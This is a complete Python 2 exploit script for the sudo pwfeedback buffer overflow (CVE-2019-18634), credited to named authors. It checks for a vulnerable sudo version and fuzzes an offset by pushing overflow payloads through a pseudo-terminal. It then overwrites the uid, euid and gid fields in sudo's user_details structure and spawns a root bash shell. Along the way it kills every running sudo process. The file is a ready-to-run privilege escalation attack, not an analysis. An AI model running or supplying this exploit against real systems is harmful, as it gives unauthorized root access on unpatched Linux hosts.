#!/usr/bin/python
# -*- coding: utf-8 -*-
#
#
# Title: Sudo 1.7.1 to 1.8.30 - Buffer Overflow
# Date: 2020-02-09
# Authors: Helvio Junior (M4v3r1ck) and cardinal3
# Software: Sudo
# CVE: CVE-2019-18634
# Reference: https://www.sudo.ws/alerts/pwfeedback.html
#
#
# Tested on:
#   Ubuntu: Sudo Version: 1.8.16, 1.8.25, 1.8.30
#   Debian: Sudo Version: 1.8.27
#   CentOS: Sudo Version: 1.8.23
#

import sys, re, os, termios, sys, pty, subprocess, time, fcntl, threading
from Queue import *

# Fuzzer range
# if you received an error aboult fuzzer, adjust this values
fuzz_start=500
fuzz_end=700

# Variables, do not touch here
TGP_ASKPASS=0x4
SUDO_CONV_REPL_MAX=255
cc     = 6
sudo_term_eof = str("\x00")
sudo_term_erase = str("\x00")
sudo_term_kill = str("\x00")

stdout = ""
stderr = ""
q = Queue()
offset = 0
chk=True

def flags(names):
    """Return the result of ORing a set of (space separated) :py:mod:`termios`
    module constants together."""
    return sum(getattr(termios, name) for name in names.split())

def cfmakeraw(tflags):
    """Given a list returned by :py:func:`termios.tcgetattr`, return a list
    that has been modified in the same manner as the `cfmakeraw()` C library
    function."""
    iflag, oflag, cflag, lflag, ispeed, ospeed, cc = tflags
    iflag &= ~flags('IGNBRK BRKINT PARMRK ISTRIP INLCR IGNCR ICRNL IXON')
    oflag &= ~flags('OPOST IXOFF')
    lflag &= ~flags('ECHO ECHOE ECHONL ICANON ISIG IEXTEN')
    cflag &= ~flags('CSIZE PARENB')
    cflag |= flags('CS8')

    # TODO: one or more of the above bit twiddles sets or omits a necessary
    # flag. Forcing these fields to zero, as shown below, gets us what we want
    # on Linux/OS X, but it is possibly broken on some other OS.
    iflag = 0
    oflag = 0
    lflag = 0
    return [iflag, oflag, cflag, lflag, ispeed, ospeed, cc]

def execute():
    #f= open("/tmp/teste.txt","w+")
    #f.write("UID: %d\n" % os.getuid())
    #f.close()

    os.dup2(sys.stderr.fileno(), sys.stdin.fileno())
    os.dup2(sys.stderr.fileno(), sys.stdout.fileno())

    print "[*] Pwned by M4v3r1ck, enjoy your shell!"

    pty.spawn("/bin/bash")

def create_payload(char, size):
    global SUDO_CONV_REPL_MAX, sudo_term_kill
    rest = size
    vmax = SUDO_CONV_REPL_MAX - 2
    payload = ""
    while rest > 0:
        if rest >= vmax:
            payload += char * vmax
            payload += sudo_term_kill
            rest -= vmax
        else:
            payload += char * rest
            payload += sudo_term_kill
            rest -= rest

    return payload

def check_version():
    p = subprocess.Popen(("sudo", "-V"), 
           stdout=subprocess.PIPE, 
           stderr=subprocess.STDOUT)
    stdout,stderr = p.communicate()
    z = re.search("([0-9]\.[0-9]{1,3}\.[0-9a-zA-Z]{1,7})", stdout)
    if z:
        ok = False
        version = z.group(0)
        print "[+] Sudo version: %s" % version
        v1 = version.split(".", 3)
        revision = re.sub('[^0-9]+', '.', v1[2])
        r1 = revision.split(".", 2)
        if (len(r1) > 1):
            v1[2] = r1[0]
        if int(v1[0]) == 1:
            if int(v1[1]) == 7 and int(v1[2])  >= 1:
                ok = True
            elif int(v1[1]) == 8 and int(v1[2])  <= 30:
                ok = True
        return ok
    else:
        return False

def killall():
    os.system("ps aux | grep sudo | grep -v grep | tr -s \"[:blank:]\" \" \" | cut -d' ' -f2 | xargs kill -9")

def open_pty():
    global TGP_ASKPASS, cc, sudo_term_eof, sudo_term_erase, sudo_term_kill

    (master_fd, sudo_pty) = pty.openpty()

    if sudo_pty < 0:
        print "[!] Error openning pty"
        sys.exit(1)

    attr = termios.tcgetattr(master_fd)
    if attr == None:
        print "[!] Error getting pty attributes"
        sys.exit(1)

    new = cfmakeraw(attr)
    termios.tcsetattr(sudo_pty, termios.TCSADRAIN, new)

    i_term_eof = attr[cc][termios.VEOF]
    i_term_erase = attr[cc][termios.VERASE]
    i_term_kill = attr[cc][termios.VKILL]

    if (i_term_eof == 0 or i_term_eof == TGP_ASKPASS):
        print "[!] sudo_term_eof value conflict (%d)" % i_term_eof
        '''
        As the checker function do an and between 2 values we can use the strategy below to permit solve the conflict
        Original code:
           #undef ISSET
           #define ISSET(t, f)     ((t) & (f))
        '''
        i_term_eof = TGP_ASKPASS | 0x60
        print "    changing TGP_ASKPASS to (%d)" % i_term_eof

    if (i_term_erase == 0 or i_term_erase == TGP_ASKPASS):
        print "[!] sudo_term_erase value conflict (%d)" % i_term_erase
        sys.exit(1)

    if (i_term_kill == 0 or i_term_kill == TGP_ASKPASS):
        print "[!] sudo_term_kill value conflict (%d)" % i_term_kill
        sys.exit(1)

    flags = fcntl.fcntl( sudo_pty, fcntl.F_GETFL ) 
    flags |= os.O_NONBLOCK               
    fcntl.fcntl( sudo_pty, fcntl.F_SETFL, flags )

    ptyname = str(os.ttyname(sudo_pty))
    print "    Using pty file '%s'" % ptyname

    sudo_term_kill = str(i_term_kill)
    sudo_term_erase = str(i_term_erase)
    sudo_term_eof = str(i_term_eof)

    return (sudo_pty, ptyname, master_fd)

def output_reader(proc, offset):
    global stdout, stderr
    try:
        (s1, e1) = proc.communicate()
        stdout = s1
        stderr = e1
        q.put((offset, stdout, stderr))

    except:
        pass
    
def worker():
    global chk
    while chk:
        item = q.get()
        do_work(item)
        q.task_done()

def do_work(item):
    global offset 
    if item[1].find("SUDO_ASKPASS") > 0 or item[2].find("SUDO_ASKPASS") > 0:
        offset = item[0]

def start_ckeck(offset):
    global TGP_ASKPASS, cc, sudo_term_eof, sudo_term_erase, sudo_term_kill, q

    print "    Checking offset %d" % offset

    (sudo_pty, ptyname, master_fd) = open_pty()
    #time.sleep(10)

    payload  = create_payload("A", 256)
    #payload += create_payload("\x00", 292)

    payload += create_payload("\x00", offset - 256)

    # substitui a flag
    payload += "\x05\x00\x00\x00" # necessito de 0x05 mas como a funcao que verifica usa esse valor & 0x04 o resultado sera o mesmo

    payload += sudo_term_kill
    payload += "\n"

    written = os.write(master_fd, payload)
    if written != len(payload):
        print "    Error writing payload"

    script = os.path.realpath(__file__)

    print "    Executing sudo..."

    #os.system("sudo -S id < %s" % ptyname)
    p = subprocess.Popen("sudo -k -S id < %s" % ptyname, 
           stdout=subprocess.PIPE, 
           stderr=subprocess.PIPE, 
           stdin=None,
           shell=True)

    t1 = threading.Thread(target=output_reader, args=(p,offset,))
    t1.start()

    time.sleep(1)

def exploit():

    global TGP_ASKPASS, cc, offset

    (sudo_pty, ptyname, master_fd) = open_pty()
    #time.sleep(10)

    
    payload  = create_payload("A", 256)
    payload += create_payload("\x00", offset - 256)


    # substitui a flag
    payload += "\x05\x00\x00\x00" # necessito de 0x05 mas como a funcao que verifica usa esse valor & 0x04 o resultado sera o mesmo

    #Padding atÃ© o user detail 
    payload += ((("\x00" * 4) * 7)+ sudo_term_kill)

    '''
    gef> ptype/o struct user_details
    /* offset    |  size */  type = struct user_details {
    /*    0      |     4 */    pid_t pid;
    /*    4      |     4 */    pid_t ppid;
    /*    8      |     4 */    pid_t pgid;
    /*   12      |     4 */    pid_t tcpgid;
    /*   16      |     4 */    pid_t sid;
    /*   20      |     4 */    uid_t uid;
    /*   24      |     4 */    uid_t euid;
    /*   28      |     4 */    uid_t gid;
    /*   32      |     4 */    uid_t egid;
    /* XXX  4-byte hole */
    /*   40      |     8 */    const char *username;
    /*   48      |     8 */    const char *cwd;
    /*   56      |     8 */    const char *tty;
    /*   64      |     8 */    const char *host;
    /*   72      |     8 */    const char *shell;
    /*   80      |     8 */    gid_t *groups;
    /*   88      |     4 */    int ngroups;
    /*   92      |     4 */    int ts_rows;
    /*   96      |     4 */    int ts_cols;
    /* XXX  4-byte padding */

                               /* total size (bytes):  104 */
                             }
    '''

    payload += (("\x00" * 20) + sudo_term_kill)

    #uid
    payload += (("\x00" * 4) + sudo_term_kill)
    #euid
    payload += (("\x00" * 4) + sudo_term_kill)

    #gid
    payload += (("\x00" * 4) + sudo_term_kill)


    payload += sudo_term_kill
    payload += "\n"

    written = os.write(master_fd, payload)
    if written != len(payload):
        print "[-] Error writing payload"

    script = os.path.realpath(__file__)

    os.environ['SUDO_ASKPASS'] = script

    print "[*] Executing sudo..."
    os.system("sudo -S id < %s" % ptyname)

    os.close(master_fd)
    os.close(sudo_pty)


def main():

    global TGP_ASKPASS, cc, offset

    print "[*] Fuzzinf offset, this process will shows sudo output, please ignore it!\n\n"

    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()

    # Define what is the offset
    for x in range(fuzz_start-1,fuzz_end):
        if offset == 0:
            try:
                start_ckeck(x)
            except:
                # in some cases we face error related "Too many open files"
                print "[!] Error fuzzing offset, restart fuzzing at offset %d" % (x-1)
                sys.exit(1)

    if offset != 0:
        chk = False

    if offset == 0:
        time.sleep(5)

    # close all sudo
    killall()

    chk = False

    if offset == 0:
        print "[!] Error fuzzing offset"
        sys.exit(1)

    print "\n\n[+] Offset found at %d bytes" % offset
    exploit()

if __name__ == '__main__':
    # if have arguments is the exploited sudo executing-me
    if (len(sys.argv) - 1) > 0:
        execute();
    else:
        vulnerable = check_version()
        if vulnerable:
            print "[+] System info:"
            os.system("hostnamectl")
            print "\n"
            main()
            os.system("reset")
        else:
            print "[!] Your sudo version is not vulnerable!"
